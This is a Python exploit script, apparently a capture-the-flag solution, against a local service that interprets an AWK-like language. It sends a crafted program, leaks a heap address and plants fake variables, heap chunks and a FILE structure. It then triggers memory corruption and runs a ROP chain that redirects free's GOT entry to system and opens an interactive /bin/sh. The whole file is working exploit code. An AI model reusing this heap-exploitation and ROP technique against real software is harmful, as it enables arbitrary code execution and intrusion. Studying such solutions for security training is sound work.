from pwnlib import *

s = Socket(("localhost", 3232))

INT = 1
STRING = 2
REGEX = 3

program = """
START {}

/LEAK/ {
	v = "foo";
	printf "%d", v;
	print "||||"; 
}

/EMPLACE/ {
	print "||||"; 
}

/CORRUPT/ {
	v1 = 1;
	v2 = 1;
	v3 = 1;
	v4 = 1;
	v5 = 1;
	v6 = 1;

	"a" ~ "[AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]";

	trigger = 1;

	v7 = "HELLO WORLD";
	vx = 223213;
	v8 = 123213;
	v9 = "YES";
	v10 = "XXXX";

	"a" ~ "[\x81]";

	$0 ~ "a";

	overwrite = 1234;
}


FINISH {
}"""



### deliver the malicious program

s.send(program)
s.ru("Ready.\n")


### leak a heap ptr

s.send("LEAK\n")
heap_ptr = int(s.ru("||||\n"))
heap_base = heap_ptr - 0x3f80  - 0xa0

print "heap: 0x%x" % heap_base

assert heap_base & 0xfff == 0
input_addr = heap_base + 0x2d20  + 0xa0

print "input: 0x%x" % input_addr


### emplace some data for later use

def make_var(name_ptr, type, data_ptr, as_string_repr=0):
	return ("\x00"*0x10 + 
		pd(name_ptr) + pd(type) + pd(data_ptr) + pd(as_string_repr))

payload  = "EMPLACE "
payload += "A"*(0x300 - len(payload))

RS_var_addr = input_addr + len(payload)
payload += make_var(
	name_ptr=(input_addr + 0x400),
	type=STRING,
	data_ptr=(input_addr + 0x400))

# fake chunk header
payload += pd(0x1234) + pd(0x29)

fileptr_addr = heap_base + 8 
fake_file_addr = input_addr + 0x420
overwrite_var_addr = input_addr + len(payload)

# fake "overwrite" variable 
payload += pd(fake_file_addr) # the word we write into the destination
payload += pd(fileptr_addr) # write destination when linking-in
payload += "\x00"*8
payload += pd(input_addr + 0x400 + 3)
payload += pd(STRING)
payload += "\x00"*8

# another fake chunk
payload += "AAAA" + pd(0x21) 

payload += "B"*(0x400 - len(payload))
payload += "RS\x00"
payload += "overwrite\x00"

payload += "C"*(0x41c - len(payload))
assert len(payload) == 0x41c

call_table_addr = input_addr + 0x41c - 0x20
payload += pd(0x0804a6de) # this is $pc = [call_table + 0x20]

# fake file
ffile = bytearray()
ffile += pd(0xfbad208b)
ffile += "A"*68
ffile += pd(0x80520a0) # some writable addr
ffile += pattern(0x100)

# this determines the offset at which to look for the call table
ffile[0x46] = 'A' 

# call table ptr
ffile[76+137:76+137+4] = pd(call_table_addr)

# new $sp and $es for 0x804a6de:	les    esp,FWORD PTR [eax+0x5b]
rop_stack_addr = input_addr + 0x600
ffile[76+15:76+15+6] = pd(rop_stack_addr - 8) + ph(0x7b) 

payload += str(ffile)

payload += "D"*(0x600 - len(payload))

# now the ROP stack

adder = 0x0804e1f3 # add dword ptr [esi + 0x5f], ebx ; pop ebp ; ret
pop_esi = 0x080491d4 # pop esi ; ret
pop_ebx = 0x08048661 # pop ebx ; ret
call_deref_esi = 0x08048c6c # call dword ptr [esi]
free_got = 0x8052014
system_offset = 0x40190
free_offset = 0x76c60

payload += pd(pop_esi)
payload += pd(free_got - 0x5f)
payload += pd(pop_ebx)
payload += pd((system_offset - free_offset) % (1<<32))
payload += pd(adder)
payload += pd(0xdeadbeef) # ebp, popped
payload += pd(pop_esi)
payload += pd(free_got)
payload += pd(call_deref_esi)
payload += pd(input_addr + len(payload) + 4) # next word
payload += "/bin/sh\x00"


assert "\n" not in payload
s.send(payload + "\n")
s.ru("||||\n")



### trigger memory corruption

payload  = "CORRUPT"
payload += "A"*(200 - len(payload))

# here begins the data_array
payload += "A"*(0x15*4)

# the "RS" variable
payload += pd(RS_var_addr)

payload += "CCCC"

# the "overwrite" variable
payload += pd(overwrite_var_addr)

payload += pattern(0x230 - len(payload) - 1)
assert len(payload) == 0x230 - 1, len(payload)

s.send(payload + "\n")






s.interact()



